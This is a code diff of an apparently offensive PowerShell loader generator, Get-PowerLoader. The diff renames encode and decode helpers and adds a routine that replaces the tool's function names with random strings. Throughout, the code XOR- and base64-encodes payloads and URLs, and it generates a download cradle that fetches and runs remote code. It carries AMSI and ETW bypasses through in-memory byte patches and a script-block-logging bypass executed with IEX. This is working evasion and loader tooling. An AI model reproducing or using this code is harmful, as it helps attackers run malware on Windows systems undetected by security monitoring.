@@ -57,22 +57,22 @@ function Get-PowerLoader {
         $ClearComments
     )
 
-    $srcCode = ${function:Get-DecodedBytes}.Ast.Extent.Text + [Environment]::NewLine
+    $srcCode = ${function:Get-DecodedByte}.Ast.Extent.Text + [Environment]::NewLine
     if ($FilePath) {
         $bytes = [IO.File]::ReadAllBytes((Resolve-Path $FilePath))
         if ($ClearComments -and $Type -eq "PoSh") {
             $bytes = Remove-PoshComments($bytes)
         }
         $bytes = $bytes | foreach {$_ -bxor 1}
-        $encCode = Get-EncodedBytes($bytes)
-        $srcCode += '$code = Get-DecodedBytes("' + $encCode + '") | foreach {$_ -bxor 1}' + [Environment]::NewLine
+        $encCode = Get-EncodedByte($bytes)
+        $srcCode += '$code = Get-DecodedByte("' + $encCode + '") | foreach {$_ -bxor 1}' + [Environment]::NewLine
     }
     elseif ($FileUrl) {
         $srcCode += ${function:Invoke-DownloadCradle}.Ast.Extent.Text + [Environment]::NewLine
         $bytes = [Text.Encoding]::UTF8.GetBytes($FileUrl)
         $bytes = $bytes | foreach {$_ -bxor 1}
-        $encUrl = Get-EncodedBytes($bytes)
-        $srcCode += '$code = Invoke-DownloadCradle([Text.Encoding]::UTF8.GetString($(Get-DecodedBytes("' + $encUrl + '") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
+        $encUrl = Get-EncodedByte($bytes)
+        $srcCode += '$code = Invoke-DownloadCradle([Text.Encoding]::UTF8.GetString($(Get-DecodedByte("' + $encUrl + '") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
         if ($ClearComments -and $Type -eq "PoSh") {
             $srcCode += ${function:Remove-PoshComments}.Ast.Extent.Text + [Environment]::NewLine
             $srcCode += '$code = Remove-PoshComments($code)' + [Environment]::NewLine
@@ -86,8 +86,8 @@ function Get-PowerLoader {
         $args = $ArgumentList -join ','
         $bytes = [Text.Encoding]::UTF8.GetBytes($args)
         $bytes = $bytes | foreach {$_ -bxor 1}
-        $encArgs = Get-EncodedBytes($bytes)
-        $srcArgs = '$args = $([Text.Encoding]::UTF8.GetString($(Get-DecodedBytes("' + $encArgs + '") | foreach {$_ -bxor 1}))).Split('','')' + [Environment]::NewLine
+        $encArgs = Get-EncodedByte($bytes)
+        $srcArgs = '$args = $([Text.Encoding]::UTF8.GetString($(Get-DecodedByte("' + $encArgs + '") | foreach {$_ -bxor 1}))).Split('','')' + [Environment]::NewLine
     }
     else {
         $srcArgs = '$args = $null' + [Environment]::NewLine
@@ -99,20 +99,20 @@ function Get-PowerLoader {
     }
     switch ($Bypass) {
         'AMSI' {
-            $srcBypass += '$d = $([Text.Encoding]::UTF8.GetString($(Get-DecodedBytes("H4sIAAAAAAAEAEvIKcrQT83NBQCpd2pDCAAAAA==") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
-            $srcBypass += '$f = $([Text.Encoding]::UTF8.GetString($(Get-DecodedBytes("H4sIAAAAAAAEAHPIKcoISkrIdy5JT08pBgCSRCbiDgAAAA==") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
+            $srcBypass += '$d = $([Text.Encoding]::UTF8.GetString($(Get-DecodedByte("H4sIAAAAAAAEAEvIKcrQT83NBQCpd2pDCAAAAA==") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
+            $srcBypass += '$f = $([Text.Encoding]::UTF8.GetString($(Get-DecodedByte("H4sIAAAAAAAEAHPIKcoISkrIdy5JT08pBgCSRCbiDgAAAA==") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
             $srcBypass += 'if ([Environment]::Is64BitOperatingSystem) {$p = [byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)} else {$p = [byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00)}' + [Environment]::NewLine
             $srcBypass += 'Invoke-MemoryPatch -Dll $d -Func $f -Patch $p' + [Environment]::NewLine
         }
         'ETW' {
-            $srcBypass += '$d = $([Text.Encoding]::UTF8.GetString($(Get-DecodedBytes("H4sIAAAAAAAEAMsvTc3N1QdiALm3ONgJAAAA") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
-            $srcBypass += '$f = $([Text.Encoding]::UTF8.GetString($(Get-DecodedBytes("H4sIAAAAAAAEAHMpLXMpT8kvDSvOKE0BAGFTlzkNAAAA") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
+            $srcBypass += '$d = $([Text.Encoding]::UTF8.GetString($(Get-DecodedByte("H4sIAAAAAAAEAMsvTc3N1QdiALm3ONgJAAAA") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
+            $srcBypass += '$f = $([Text.Encoding]::UTF8.GetString($(Get-DecodedByte("H4sIAAAAAAAEAHMpLXMpT8kvDSvOKE0BAGFTlzkNAAAA") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
             $srcBypass += 'if ([Environment]::Is64BitOperatingSystem) {$p = [byte[]] (0xc3)} else {$p = [byte[]] (0xc2, 0x14, 0x00, 0x00)}' + [Environment]::NewLine
             $srcBypass += 'Invoke-MemoryPatch -Dll $d -Func $f -Patch $p' + [Environment]::NewLine
         }
         'SBL' {
             $srcBypass += '$b = "H4sIAAAAAAAEADWOUUsDMRCEf8s9GO6gR/5CUVAEsXhihdKHJdmmW71NuE1WQumPNyf4OMN8M6O5Xg/veD7arQjOnqt9RP2oCw5mqqI42xdIEHDGpHZbNM6gFJOdXKZFHzi6L9OvzBMhnwYjFBJoyShmNLuY3opncqNow1xLTqifwAWHu1SYx2GHP5tX/41Ou//B+8jcdFuRVpwwk7PPIJeGHkQzpXA0fX9zoO5y3WdS3Owhp+a3ir9bnV9/dRxDWF1fFxDpzkCMJ2tuvxHo1jL1AAAA"' + [Environment]::NewLine
-            $srcBypass += 'IEX $([Text.Encoding]::UTF8.GetString($(Get-DecodedBytes($b) | foreach {$_ -bxor 1})))' + [Environment]::NewLine
+            $srcBypass += 'IEX $([Text.Encoding]::UTF8.GetString($(Get-DecodedByte($b) | foreach {$_ -bxor 1})))' + [Environment]::NewLine
         }
     }
 
@@ -127,6 +127,8 @@ function Get-PowerLoader {
         }
     }
     $script = $srcCode + $srcArgs + $srcBypass + $srcLoader
+    $words = @('Get-DecodedByte','Invoke-DownloadCradle','Invoke-MemoryPatch','Invoke-PoshLoader','Invoke-NetLoader','Remove-PoshComments')
+    $script = Get-ObfuscatedString -InputString $script -BlackList $words
     return [ScriptBlock]::Create($script)
 }
 
@@ -146,7 +148,20 @@ function Local:Remove-PoshComments {
     return $byteArray
 }
 
-function Local:Get-EncodedBytes {
+function Local:Get-ObfuscatedString {
+    Param (
+        [String] $InputString,
+        [String[]] $BlackList
+    )
+
+    foreach($word in $BlackList) {
+        $string = -join ((0x41..0x5A) + (0x61..0x7A) | Get-Random -Count 11 | %{[char]$_})
+        $InputString = $InputString.Replace($word,$string)
+    }
+    return $InputString
+}
+
+function Local:Get-EncodedByte {
     Param (
         [Parameter(Mandatory = $True)]
         [byte[]] $ByteArray
@@ -161,7 +176,7 @@ function Local:Get-EncodedBytes {
     return [Convert]::ToBase64String($out)
 }
 
-function Local:Get-DecodedBytes {
+function Local:Get-DecodedByte {
     Param (
         [Parameter(Mandatory = $True)]
         [string] $EncBytes
